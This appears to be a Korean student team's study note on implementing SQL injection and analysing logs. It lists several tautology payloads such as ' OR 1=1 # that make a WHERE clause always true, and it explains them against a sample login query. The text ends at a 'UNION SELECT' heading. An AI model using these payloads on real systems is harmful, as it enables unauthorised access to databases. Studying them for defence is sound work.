##  SQL Injection 구현 및 log 분석
SQL injection: 주민서, 이종학

log 분석: 김현서, 허남정, 오성택

---
###  1. 조건문을 이용한 SQL Injection
이 유형의 payload는 WHERE절의 조건을 항상 참으로 만들어 조건을 우회하는 방법 입니다.
- ' OR 1=1 #
- ' OR TRUE #
- ' OR '1'='1' #
- ' OR '1'='1' LIMIT 1 #
- ' OR TRUE LIMIT 1 #
- ' OR 1=1 LIMIT 5 #
이런 payload는 다음과 같은 쿼리가 있다고 가정했을 때 사용합니다.

SELECT * FROM table WHERE id = 'sql_injection' AND pw = 'sql_injection’

WHERE절의 조건이 항상 참이 되므로 모든 행이 반환됩니다.

---
### 2. UNION SELECT
